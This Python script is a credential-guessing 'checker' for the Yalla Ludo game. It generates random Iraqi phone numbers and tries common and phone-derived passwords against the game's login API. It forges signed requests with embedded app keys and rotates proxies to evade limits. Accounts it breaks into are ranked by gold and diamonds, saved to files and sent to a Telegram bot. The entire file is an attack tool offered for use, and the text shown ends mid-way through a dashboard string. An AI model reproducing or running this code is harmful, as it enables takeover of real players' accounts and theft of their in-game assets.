#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Yalla Ludo - Iraq Number Checker
# By @to_ls

import base64
import json
import hashlib
import hmac
import time
import uuid
import random
import string
import asyncio
import aiohttp
import sys
import os
import threading
from collections import defaultdict
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import pyperclip

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich import box
    console = Console()
    RICH_AVAILABLE = True
except:
    RICH_AVAILABLE = False
    try:
        from colorama import init, Fore, Style
        init(autoreset=True)
    except:
        Fore = Style = type('obj', (object,), {
            'GREEN': '', 'RED': '', 'YELLOW': '', 'CYAN': '', 
            'MAGENTA': '', 'WHITE': '', 'RESET_ALL': ''
        })()

VER = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
VERH = "1.4.9.2"
L3 = "L3)qk*@8"
K = "8a9520f016427a54d5de40335bf7e4fe"
MKEY = b"4e82797b276c5cb729db62aaa229a057"
MIV = b"0102030405060708"
HERA = "f580270da66e44438d5ed30fdb08ebba"
SPRE = "2.0_2_"
LOGIN_PATH = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
PROFILE_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
TIMEOUT = 15

LOGIN_SERVERS = [
    "https://httpgateway.carrstuv.com",
    "https://httpgateway.lampjkl.com",
    "https://httpgateway.funcdeg.com",
    "https://httpgateway.planecde.com",
    "https://httpgateway.yalla.games",
]

BOT_TOKEN = ""
CHAT_IDS = []
MAX_RESULTS = 0
PROXY_FILE = "/storage/emulated/0/Download/proxyscrape_premium_http_proxies.txt"

PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]
PHONE_PASSWORDS = ["077", "078", "079"]

def _aes_cbc(key, iv, pt):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(pt, 16))

def _xor_b64(data_str, key_str):
    kb = key_str.encode()
    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
    return base64.b64encode(xo).decode()

def _xor_decrypt(raw, key_str):
    kb = key_str.encode()
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(raw))

def _gen_shu():
    raw = uuid.uuid4().bytes + uuid.uuid4().bytes[:8]
    return base64.b64encode(raw).decode().replace("+", "-").replace("/", "_").rstrip("=")[:36]

def _gen_dev():
    device_id = str(uuid.uuid4())
    android_id = uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16]
    shumeng = _gen_shu()
    nonce = f"{random.randint(0, 2**31-1)}_{uuid.uuid4()}"
    return device_id, android_id, shumeng, nonce

def _gen_traceparent():
    return f"00-{uuid.uuid4().hex + uuid.uuid4().hex[:16]}-{uuid.uuid4().hex[:16]}-00"

def build_login(mobile, password_md5, area_code=964):
    now = int(time.time() * 1000)
    device_id, android_id, shumeng, nonce = _gen_dev()
    
    bag = {
        "timeSpan": str(now),
        "version": VERH,
        "deviceId": device_id,
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": shumeng,
        "nonce": nonce,
        "plateType": 0,
        "LanguageId": 2,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": "IQ",
        "X-Sim-Country": "IQ",
        "AndroidId": android_id,
        "appType": 0,
    }
    bag_b64 = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
    
    sign_data = LOGIN_PATH + VER + bag_b64
    sig = hmac.new(K.encode(), sign_data.encode(), hashlib.sha256).hexdigest()
    xsign = SPRE + sig
    
    medusa_pt = f'{hashlib.md5(sign_data.encode()).hexdigest()}-{len(sign_data)}-{K}-{L3}'.encode()
    xmedusa = base64.b64encode(_aes_cbc(MKEY, MIV, medusa_pt)).decode()

    body = {
        "mobile": mobile,
        "areaCode": area_code,
        "password": password_md5,
        "languageId": 2,
        "nationalityId": 1,
        "hostConfig": [
            {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.yalla.games", "type": 2, "version": 4},
            {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.carrstuv.com", "type": 2, "version": 19},
            {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.carrstuv.com", "type": 2, "version": 20},
        ],
        "simCountry": "IQ",
        "version": VERH,
        "deviceId": device_id,
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": shumeng,
        "nonce": nonce,
        "plateType": 0,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": "IQ",
        "X-Sim-Country": "IQ",
        "AndroidId": android_id,
        "IsSubpackages": 0,
        "appType": 0,
    }
    body_json = json.dumps(body, separators=(",", ":"), ensure_ascii=False)
    param = _xor_b64(body_json, K)
    payload = {"paramJsonString": param}
    
    headers = {
        "User-Agent": VER,
        "UserId": "0",
        "X-App-Id": "ludo",
        "X-Baggage": bag_b64,
        "X-Access-Token": "",
        "X-Timestamp": str(now),
        "versionString": VERH,
        "X-Sign": xsign,
        "X-Hera": HERA,
        "X-Time": str(now + random.randint(30, 60)),
        "X-Medusa": xmedusa,
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "traceparent": _gen_traceparent(),
    }
    
    dev = {"deviceId": device_id, "AndroidId": android_id, "shuMengId": shumeng, "nonce": nonce}
    return headers, payload, dev

def build_profile(token, user_id, dev):
    now = int(time.time() * 1000)
    nonce = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
    bag_sign = hashlib.md5((K + nonce).encode()).hexdigest().upper()
    
    bag = {
        "token": token,
        "sign": bag_sign,
        "timeSpan": str(now),
        "version": VERH,
        "deviceId": dev["deviceId"],
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": dev["shuMengId"],
        "nonce": nonce,
        "plateType": 0,
        "LanguageId": 2,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": "IQ",
        "X-Sim-Country": "IQ",
        "AndroidId": dev["AndroidId"],
        "appType": 0,
    }
    bag_b64 = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
    
    sign_data = PROFILE_PATH + token + VER + bag_b64
    sig = hmac.new(K.encode(), sign_data.encode(), hashlib.sha256).hexdigest()
    xsign = SPRE + sig
    
    medusa_pt = f'{hashlib.md5(sign_data.encode()).hexdigest()}-{len(sign_data)}-{K}-{L3}'.encode()
    xmedusa = base64.b64encode(_aes_cbc(MKEY, MIV, medusa_pt)).decode()
    
    body = {"accountId": int(user_id)}
    body_json = json.dumps(body, separators=(",", ":"))
    param = _xor_b64(body_json, K)
    
    headers = {
        "User-Agent": VER,
        "UserId": user_id,
        "X-App-Id": "ludo",
        "X-Baggage": bag_b64,
        "X-Access-Token": token,
        "X-Timestamp": str(now + random.randint(50, 300)),
        "versionString": VERH,
        "X-Sign": xsign,
        "X-Hera": HERA,
        "X-Time": str(now + random.randint(50, 300)),
        "X-Medusa": xmedusa,
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
    }
    
    return headers, {"paramJsonString": param}

async def login_account(session, mobile, password_md5, area_code=964, proxy=None):
    for server in LOGIN_SERVERS:
        try:
            headers, payload, dev = build_login(mobile, password_md5, area_code)
            url = server + LOGIN_PATH
            
            async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                if r.status != 200:
                    continue
                
                data = await r.json()
                param = data.get("paramJsonString", "")
                if param:
                    raw = base64.b64decode(param)
                    decrypted = _xor_decrypt(raw, K)
                    result = json.loads(decrypted.decode('utf-8'))
                else:
                    result = data
                
                if result.get("status") == 0:
                    user_data = result.get("data", {})
                    token = user_data.get("token", "")
                    user_id = str(user_data.get("id", user_data.get("showNumId", "")))
                    
                    if token and user_id:
                        profile = await fetch_profile(session, token, user_id, dev, proxy)
                        return {
                            "success": True,
                            "data": user_data,
                            "token": token,
                            "user_id": user_id,
                            "dev": dev,
                            "profile": profile
                        }
                    else:
                        return {"success": True, "data": user_data, "token": token, "user_id": user_id, "dev": dev, "profile": None}
                else:
                    return {"success": False, "status": result.get("status"), "tips": result.get("tips", "")}
                    
        except Exception as e:
            continue
    
    return {"success": False, "error": "All servers failed"}

async def fetch_profile(session, token, user_id, dev, proxy=None):
    if not token or not user_id:
        return None
    
    for server in LOGIN_SERVERS:
        try:
            headers, payload = build_profile(token, user_id, dev)
            url = server + PROFILE_PATH
            
            async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                if r.status in (403, 500, 404):
                    continue
                
                data = await r.json()
                param = data.get("paramJsonString", "")
                if param:
                    raw = base64.b64decode(param)
                    decrypted = _xor_decrypt(raw, K)
                    result = json.loads(decrypted.decode('utf-8'))
                else:
                    result = data
                
                if result.get("status") == 0:
                    return result.get("data", {})
                    
        except Exception:
            continue
    
    return None

stats = defaultdict(int)
gold_stats = defaultdict(int)
diamond_stats = defaultdict(int)
level_stats = defaultdict(int)
vip_stats = defaultdict(int)
found_accounts = []
verify_accounts = []
stats_lock = threading.Lock()
stop_flag = False
start_time = time.time()

def save_account_to_file(account, filepath):
    try:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(f"{account['phone']}:{account['password']}\n")
        return True
    except Exception as e:
        return False

def save_account_full(account, filepath):
    try:
        with open(filepath, 'a', encoding='utf-8') as f:
            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
        return True
    except Exception as e:
        return False

def save_account_by_gold(account):
    gold = account.get('gold', 0)
    folder = "accounts_by_gold"
    os.makedirs(folder, exist_ok=True)
    
    if gold < 1000000:
        filename = f"{folder}/0-1M.txt"
    elif gold < 5000000:
        filename = f"{folder}/1M-5M.txt"
    elif gold < 10000000:
        filename = f"{folder}/5M-10M.txt"
    elif gold < 20000000:
        filename = f"{folder}/10M-20M.txt"
    elif gold < 50000000:
        filename = f"{folder}/20M-50M.txt"
    elif gold < 100000000:
        filename = f"{folder}/50M-100M.txt"
    else:
        filename = f"{folder}/100M+.txt"
    
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Gold: {gold:,} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
        return True
    except Exception as e:
        return False

class ProxyManager:
    def __init__(self, proxy_file=""):
        self.proxies = []
        self.working_proxies = []
        self.failed_proxies = set()
        self.proxy_lock = threading.Lock()
        self.current_index = 0
        if proxy_file:
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file):
        try:
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            proxy = self._parse_proxy(line)
                            if proxy:
                                self.proxies.append(proxy)
                self._print(f"[green][+][/green] Loaded {len(self.proxies)} proxies")
            else:
                self._print(f"[yellow][!][/yellow] Proxy file not found: {proxy_file}")
        except Exception as e:
            self._print(f"[red][-][/red] Error loading proxies: {e}")
    
    def _print(self, msg):
        if RICH_AVAILABLE:
            console.print(msg)
        else:
            print(msg)
    
    def _parse_proxy(self, line):
        if '@' in line:
            parts = line.split('@')
            if len(parts) == 2:
                auth = parts[0].split(':')
                address = parts[1].split(':')
                if len(auth) == 2 and len(address) == 2:
                    return {'ip': address[0], 'port': address[1], 'user': auth[0], 'pass': auth[1]}
        
        parts = line.split(':')
        if len(parts) == 4:
            return {'ip': parts[0], 'port': parts[1], 'user': parts[2], 'pass': parts[3]}
        if len(parts) == 2:
            return {'ip': parts[0], 'port': parts[1], 'user': None, 'pass': None}
        return None
    
    def get_proxy(self):
        with self.proxy_lock:
            if self.working_proxies:
                proxy = random.choice(self.working_proxies)
                return self._format_proxy(proxy)
            if self.proxies:
                for _ in range(5):
                    proxy = self.proxies[self.current_index % len(self.proxies)]
                    self.current_index += 1
                    proxy_str = self._format_proxy(proxy)
                    if proxy_str not in self.failed_proxies:
                        return proxy_str
                proxy = self.proxies[self.current_index % len(self.proxies)]
                self.current_index += 1
                return self._format_proxy(proxy)
            return None
    
    def _format_proxy(self, proxy):
        if isinstance(proxy, dict):
            if proxy.get('user') and proxy.get('pass'):
                return f"http://{proxy['user']}:{proxy['pass']}@{proxy['ip']}:{proxy['port']}"
            return f"http://{proxy['ip']}:{proxy['port']}"
        return proxy
    
    def mark_working(self, proxy_str):
        with self.proxy_lock:
            if proxy_str and proxy_str not in self.working_proxies:
                self.working_proxies.append(proxy_str)
                if proxy_str in self.failed_proxies:
                    self.failed_proxies.remove(proxy_str)
    
    def mark_failed(self, proxy_str):
        with self.proxy_lock:
            if proxy_str:
                self.failed_proxies.add(proxy_str)
                if proxy_str in self.working_proxies:
                    self.working_proxies.remove(proxy_str)

proxy_manager = None

used_numbers = set()
used_lock = threading.Lock()

def generate_mobile_iq():
    while True:
        third = random.choice('0123456789')
        prefix = '77' + third
        suffix = ''.join(random.choices('0123456789', k=7))
        mobile = prefix + suffix
        with used_lock:
            if mobile not in used_numbers:
                used_numbers.add(mobile)
                return mobile

def copy_to_clipboard(text):
    try:
        pyperclip.copy(text)
        return True
    except:
        return False

async def send_telegram_async(session, phone, pwd, name, uid, gold, diamond, level, exp, max_exp, royal, is_vip, vip_type, vip_end_time):
    if not BOT_TOKEN or not CHAT_IDS:
        return False
    
    message = f"""✅ Yalla Ludo Account Found!

📱 Phone: {phone}
🔑 Pass: {pwd}
👤 Name: {name}
🆔 ID: {uid}
💰 Gold: {gold:,}
💎 Diamond: {diamond:,}
📊 Level: {level}"""
    
    if exp > 0:
        message += f"\n⭐ XP: {exp:,} / {max_exp:,}"
    if royal > 0:
        message += f"\n👑 Royal: {royal}"
    
    if is_vip:
        message += f"\n🏅 VIP: ✅ Yes"
        if vip_type:
            message += f"\n📦 VIP Type: {vip_type}"
        if vip_end_time:
            try:
                end_date = datetime.fromtimestamp(vip_end_time/1000).strftime('%Y-%m-%d %H:%M')
                message += f"\n⏰ VIP Ends: {end_date}"
            except:
                pass
    else:
        message += f"\n🏅 VIP: ❌ No"
    
    message += f"\n\nBy @to_ls"
    
    copy_to_clipboard(f"{phone}:{pwd}")
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    all_success = True
    
    for chat_id in CHAT_IDS:
        sent = False
        for attempt in range(3):
            try:
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'disable_web_page_preview': True,
                    'disable_notification': False
                }
                
                async with session.post(url, data=payload, timeout=30) as resp:
                    if resp.status == 200:
                        if RICH_AVAILABLE:
                            console.print(f"[green][✓][/green] Sent to {chat_id}: {phone} | {pwd}")
                        else:
                            print(f"[✓] Sent to {chat_id}: {phone} | {pwd}")
                        sent = True
                        break
                    else:
                        await asyncio.sleep(2)
            except Exception as e:
                await asyncio.sleep(2)
        
        if not sent:
            if RICH_AVAILABLE:
                console.print(f"[red][✗][/red] Failed to send to {chat_id}: {phone} | {pwd}")
            else:
                print(f"[✗] Failed to send to {chat_id}: {phone} | {pwd}")
            all_success = False
    
    return all_success

async def send_telegram_verify_async(session, phone, pwd, name, uid, reason):
    if not BOT_TOKEN or not CHAT_IDS:
        return False
    
    message = f"""🔒 حساب مقفول - يحتاج تحقق

📱 الرقم: {phone}
🔑 الباسورد: {pwd}
⚠️ الحالة: مقفول تحقق - يحتاج فتح

By @to_ls"""
    
    copy_to_clipboard(f"{phone}:{pwd}")
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    all_success = True
    
    for chat_id in CHAT_IDS:
        sent = False
        for attempt in range(3):
            try:
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'disable_web_page_preview': True,
                    'disable_notification': False
                }
                
                async with session.post(url, data=payload, timeout=30) as resp:
                    if resp.status == 200:
                        if RICH_AVAILABLE:
                            console.print(f"[yellow][✓][/yellow] Verify sent to {chat_id}: {phone} | {pwd}")
                        else:
                            print(f"[✓] Verify sent to {chat_id}: {phone} | {pwd}")
                        sent = True
                        break
                    else:
                        await asyncio.sleep(2)
            except Exception as e:
                await asyncio.sleep(2)
        
        if not sent:
            if RICH_AVAILABLE:
                console.print(f"[red][✗][/red] Failed to send verify to {chat_id}: {phone}")
            else:
                print(f"[✗] Failed to send verify to {chat_id}: {phone}")
            all_success = False
    
    return all_success

async def check_number_async(session, mobile, semaphore, proxy=None):
    global stats, gold_stats, diamond_stats, level_stats, vip_stats, found_accounts, verify_accounts, stop_flag
    async with semaphore:
        all_passwords = list(PASSWORDS_IQ)
        
        for prefix in PHONE_PASSWORDS:
            all_passwords.append(f"{prefix}{mobile[-8:]}")
        
        for pwd in all_passwords:
            if stop_flag:
                return
            
            pwd_md5 = hashlib.md5(pwd.encode()).hexdigest().upper()
            
            try:
                result = await login_account(session, mobile, pwd_md5, 964, proxy)
                
                if result.get("success"):
                    data = result.get("data", {})
                    name = data.get("name", data.get("nickName", ""))
                    uid = result.get("user_id", "")
                    token = result.get("token", "")
                    
                    if not name or name == "" or name == "Unknown" or name == " ":
                        with stats_lock:
                            stats['verification_needed'] += 1
                            stats['total'] += 1
                        
                        verify_account = {
                            'phone': mobile,
                            'password': pwd,
                            'name': name if name else 'EMPTY',
                            'uid': uid,
                            'reason': 'EMPTY_NAME'
                        }
                        verify_accounts.append(verify_account)
                        save_account_to_file(verify_account, "verification_accounts.txt")
                        
                        if RICH_AVAILABLE:
                            console.print(f"\n[yellow][!][/yellow] VERIFICATION NEEDED: [bold]{mobile}[/bold] | {pwd}")
                            console.print(f"    Name: [red]EMPTY[/red] - Account needs verification")
                            console.print(f"    [dim]Saved to verification_accounts.txt[/dim]")
                        else:
                            print(f"\n[!] VERIFICATION NEEDED: {mobile} | {pwd}")
                            print(f"    Name: EMPTY - Account needs verification")
                            print(f"    Saved to verification_accounts.txt")
                        
                        await send_telegram_verify_async(session, mobile, pwd, name, uid, "EMPTY_NAME")
                        return
                    
                    gold = 0
                    diamond = 0
                    level = 0
                    exp = 0
                    max_exp = 0
                    royal = 0
                    is_vip = False
                    vip_type = ""
                    vip_end_time = 0
                    
                    profile = result.get("profile")
                    if profile:
                        base = profile.get("baseInfo", profile)
                        gold = int(base.get("goldNum", base.get("gold", 0)) or 0)
                        diamond = int(base.get("diamondNum", base.get("diamond", 0)) or 0)
                        level = int(base.get("levelId", base.get("level", 0)) or 0)
                        exp = int(base.get("experience", 0) or 0)
                        max_exp = int(base.get("maxExp", 100) or 100)
                        royal = int(base.get("royalLevel", 0) or 0)
                        is_vip = base.get("isVip", False)
                        
                        vip_info = profile.get("vipInfo", {})
                        if vip_info:
                            vip_type = vip_info.get("vipType", "")
                            vip_end_time = vip_info.get("vipEndTime", 0)
                            if not vip_type and is_vip:
                                vip_type = "VIP"
                    
                    if gold == 0 and diamond == 0 and level == 0:
                        with stats_lock:
                            stats['verification_needed'] += 1
                            stats['total'] += 1
                        
                        verify_account = {
                            'phone': mobile,
                            'password': pwd,
                            'name': name,
                            'uid': uid,
                            'reason': 'EMPTY_ACCOUNT'
                        }
                        verify_accounts.append(verify_account)
                        save_account_to_file(verify_account, "verification_accounts.txt")
                        
                        if RICH_AVAILABLE:
                            console.print(f"\n[yellow][!][/yellow] VERIFICATION NEEDED: [bold]{mobile}[/bold] | {pwd}")
                            console.print(f"    Name: {name}")
                            console.print(f"    Gold: [red]0[/red] - Account needs verification")
                            console.print(f"    [dim]Saved to verification_accounts.txt[/dim]")
                        else:
                            print(f"\n[!] VERIFICATION NEEDED: {mobile} | {pwd}")
                            print(f"    Name: {name}")
                            print(f"    Gold: 0 - Account needs verification")
                            print(f"    Saved to verification_accounts.txt")
                        
                        await send_telegram_verify_async(session, mobile, pwd, name, uid, "EMPTY_ACCOUNT")
                        return
                    
                    account_data = {
                        'phone': mobile,
                        'password': pwd,
                        'name': name,
                        'uid': uid,
                        'gold': gold,
                        'diamond': diamond,
                        'level': level,
                        'exp': exp,
                        'max_exp': max_exp,
                        'royal': royal,
                        'is_vip': is_vip,
                        'vip_type': vip_type,
                        'vip_end_time': vip_end_time
                    }
                    
                    with stats_lock:
                        stats['good'] += 1
                        stats['total'] += 1
                        
                        if gold < 1000000:
                            gold_stats["0-999K"] += 1
                        elif gold < 5000000:
                            gold_stats["1M-4.9M"] += 1
                        elif gold < 10000000:
                            gold_stats["5M-9.9M"] += 1
                        elif gold < 20000000:
                            gold_stats["10M-19M"] += 1
                        elif gold < 50000000:
                            gold_stats["20M-49M"] += 1
                        elif gold < 100000000:
                            gold_stats["50M-99M"] += 1
                        else:
                            gold_stats["100M+"] += 1
                        
                        if diamond < 10000:
                            diamond_stats["0-9.9K"] += 1
                        elif diamond < 50000:
                            diamond_stats["10K-49K"] += 1
                        elif diamond < 100000:
                            diamond_stats["50K-99K"] += 1
                        elif diamond < 500000:
                            diamond_stats["100K-499K"] += 1
                        elif diamond < 1000000:
                            diamond_stats["500K-999K"] += 1
                        else:
                            diamond_stats["1M+"] += 1
                        
                        if level < 10:
                            level_stats["Level 0-9"] += 1
                        elif level < 20:
                            level_stats["Level 10-19"] += 1
                        elif level < 30:
                            level_stats["Level 20-29"] += 1
                        elif level < 40:
                            level_stats["Level 30-39"] += 1
                        else:
                            level_stats["Level 40+"] += 1
                        
                        if is_vip:
                            vip_stats["VIP"] += 1
                            if vip_type:
                                vip_stats[f"VIP_{vip_type}"] += 1
                        else:
                            vip_stats["Non-VIP"] += 1
                        
                        found_accounts.append(account_data)
                    
                    save_account_to_file(account_data, "good_accounts.txt")
                    save_account_full(account_data, "good_accounts_full.txt")
                    save_account_by_gold(account_data)
                    
                    if RICH_AVAILABLE:
                        console.print(f"\n[green][+][/green] GOOD: [bold green]{mobile}[/bold green] | [bold yellow]{pwd}[/bold yellow]")
                        console.print(f"    Name: {name}")
                        console.print(f"    ID: {uid}")
                        console.print(f"    Gold: [green]{gold:,}[/green]")
                        console.print(f"    Diamond: [green]{diamond:,}[/green]")
                        console.print(f"    Level: [green]{level}[/green]")
                        if exp > 0:
                            console.print(f"    XP: [green]{exp:,} / {max_exp:,}[/green]")
                        if royal > 0:
                            console.print(f"    Royal: [green]{royal}[/green]")
                        if is_vip:
                            vip_text = f"✅ Yes"
                            if vip_type:
                                vip_text += f" ({vip_type})"
                            if vip_end_time:
                                try:
                                    end_date = datetime.fromtimestamp(vip_end_time/1000).strftime('%Y-%m-%d %H:%M')
                                    vip_text += f" until {end_date}"
                                except:
                                    pass
                            console.print(f"    VIP: [green]{vip_text}[/green]")
                        else:
                            console.print(f"    VIP: [red]No[/red]")
                        if proxy:
                            proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
                            console.print(f"    Proxy: [dim]{proxy_clean}[/dim]")
                        console.print(f"    [dim]Saved to accounts_by_gold/[/dim]")
                        console.print(f"    [dim]Copied to clipboard: {mobile}:{pwd}[/dim]")
                    else:
                        print(f"\n[+] GOOD: {mobile} | {pwd}")
                        print(f"    Name: {name}")
                        print(f"    ID: {uid}")
                        print(f"    Gold: {gold:,}")
                        print(f"    Diamond: {diamond:,}")
                        print(f"    Level: {level}")
                        if exp > 0:
                            print(f"    XP: {exp:,} / {max_exp:,}")
                        if royal > 0:
                            print(f"    Royal: {royal}")
                        if is_vip:
                            vip_text = f"Yes"
                            if vip_type:
                                vip_text += f" ({vip_type})"
                            if vip_end_time:
                                try:
                                    end_date = datetime.fromtimestamp(vip_end_time/1000).strftime('%Y-%m-%d %H:%M')
                                    vip_text += f" until {end_date}"
                                except:
                                    pass
                            print(f"    VIP: {vip_text}")
                        else:
                            print(f"    VIP: No")
                        if proxy:
                            proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
                            print(f"    Proxy: {proxy_clean}")
                        print(f"    Saved to accounts_by_gold/")
                        print(f"    Copied to clipboard: {mobile}:{pwd}")
                    
                    if RICH_AVAILABLE:
                        console.print("[yellow][!][/yellow] Sending to all Telegram recipients...")
                    
                    await send_telegram_async(session, mobile, pwd, name, uid, gold, diamond, level, exp, max_exp, royal, is_vip, vip_type, vip_end_time)
                    return
                    
                else:
                    status = result.get("status", -1)
                    tips = result.get("tips", "")
                    
                    if status == 151 or ("كلمة السر" in tips and "خاطئة" in tips):
                        continue
                    else:
                        with stats_lock:
                            stats['not_registered'] += 1
                            stats['total'] += 1
                        return
                        
            except Exception as e:
                with stats_lock:
                    stats['error'] += 1
                    stats['total'] += 1
                if proxy:
                    proxy_manager.mark_failed(proxy)
                continue
        
        with stats_lock:
            stats['wrong_pass'] += 1
            stats['total'] += 1

def create_dashboard():
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    with stats_lock:
        total = stats['total']
        good = stats['good']
        wrong = stats['wrong_pass']
        notreg = stats['not_registered']
        errors = stats['error']
        verification = stats['verification_needed']
        vip_count = vip_stats.get('VIP', 0)
        non_vip_count = vip_stats.get('Non-VIP', 0)
    
    if RICH_AVAILABLE:
        stats_table = Table(show_header=False, box=box.ROUNDED, border_style="bright_blue")
        stats_table.add_column("", style="cyan", width=15)
        stats_table.add_column("", style="green", justify="right")
        
        stats_table.add_row("Elapsed", f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        stats_table.add_row("Checked", f"[green]{total}[/green]")
        stats_table.add_row("Hits", f"[green]{good}[/green]")
        stats_table.add_row("Bads", f"[green]{wrong + notreg}[/green]")
        stats_table.add_row("Verify", f"[yellow]{verification}[/yellow]")
        stats_table.add_row("Errors", f"[green]{errors}[/green]")
        stats_table.add_row("VIP", f"[magenta]{vip_count}[/magenta]")
        stats_table.add_row("Non-VIP", f"[white]{non_vip_count}[/white]")
        
        gold_table = Table(show_header=False, box=box.MINIMAL)
        gold_table.add_column("", style="yellow")
        gold_table.add_column("", style="green", justify="right")
        gold_table.add_row("0-999K", str(gold_stats.get('0-999K', 0)))
        gold_table.add_row("1M-4.9M", str(gold_stats.get('1M-4.9M', 0)))
        gold_table.add_row("5M-9.9M", str(gold_stats.get('5M-9.9M', 0)))
        gold_table.add_row("10M-19M", str(gold_stats.get('10M-19M', 0)))
        gold_table.add_row("20M-49M", str(gold_stats.get('20M-49M', 0)))
        gold_table.add_row("50M-99M", str(gold_stats.get('50M-99M', 0)))
        gold_table.add_row("100M+", str(gold_stats.get('100M+', 0)))
        
        diamond_table = Table(show_header=False, box=box.MINIMAL)
        diamond_table.add_column("", style="cyan")
        diamond_table.add_column("", style="green", justify="right")
        diamond_table.add_row("0-9.9K", str(diamond_stats.get('0-9.9K', 0)))
        diamond_table.add_row("10K-49K", str(diamond_stats.get('10K-49K', 0)))
        diamond_table.add_row("50K-99K", str(diamond_stats.get('50K-99K', 0)))
        diamond_table.add_row("100K-499K", str(diamond_stats.get('100K-499K', 0)))
        diamond_table.add_row("500K-999K", str(diamond_stats.get('500K-999K', 0)))
        diamond_table.add_row("1M+", str(diamond_stats.get('1M+', 0)))
        
        level_table = Table(show_header=False, box=box.MINIMAL)
        level_table.add_column("", style="magenta")
        level_table.add_column("", style="green", justify="right")
        level_table.add_row("Level 0-9", str(level_stats.get('Level 0-9', 0)))
        level_table.add_row("Level 10-19", str(level_stats.get('Level 10-19', 0)))
        level_table.add_row("Level 20-29", str(level_stats.get('Level 20-29', 0)))
        level_table.add_row("Level 30-39", str(level_stats.get('Level 30-39', 0)))
        level_table.add_row("Level 40+", str(level_stats.get('Level 40+', 0)))
        
        last_found_text = ""
        for acc in found_accounts[-5:]:
            vip_status = "✅VIP" if acc['is_vip'] else "❌"
            last_found_text += f"  [green]{acc['phone']}[/green] | Pass: [yellow]{acc['password']}[/yellow] | Gold:[green]{acc['gold']:,}[/green] | Diamond:[green]{acc['diamond']:,}[/green] | Lv:[green]{acc['level']}[/green] | VIP:{vip_status}\n"
        if not last_found_text:
            last_found_text = "  No accounts found yet..."
        
        layout = Layout()
        layout.split_column(
            Layout(Panel(Text("YALLA LUDO CHECKER - Iraq Only", style="bold bright_blue"), box=box.HEAVY)),
            Layout(Panel(stats_table, title="[bold]Statistics", border_style="blue")),
            Layout(name="middle"),
            Layout(Panel(last_found_text, title="[bold green]Last Found Accounts", border_style="green")),
            Layout(Panel(f"By @to_ls | Proxies: [green]{len(proxy_manager.proxies) if proxy_manager else 0}[/green] (Working: [green]{len(proxy_manager.working_proxies) if proxy_manager else 0}[/green])", style="dim"))
        )
        
        layout["middle"].split_row(
            Layout(Panel(gold_table, title="[bold yellow]Gold Categories", border_style="yellow")),
            Layout(Panel(diamond_table, title="[bold cyan]Diamond Categories", border_style="cyan")),
            Layout(Panel(level_table, title="[bold magenta]Level Categories", border_style="magenta"))
        )
        
        return layout
    else:
        output = f"""
============================================================
                 YALLA LUDO CHECKER
              Iraq Only - 77xxxxxxxx
                By @to_ls
============================================================

------------------------------------------------------------

  Elapsed    : {hours:02d}:{minutes:02d}:{seconds:02d}
  Checked    : {total}

  Hits       : {good}
  Bads       : {wrong + notreg}
  Verify     : {verification}
  Errors     : {errors}
  VIP        : {vip_count}
  Non-VIP    : {non_vip_count}

------------------------------------------------------------

  GOLD CATEGORIES:
    0-999K    : {gold_stats.get('0-999K', 0)}
    1M-4.9M   : {gold_stats.get('1M-4.9M', 0)}
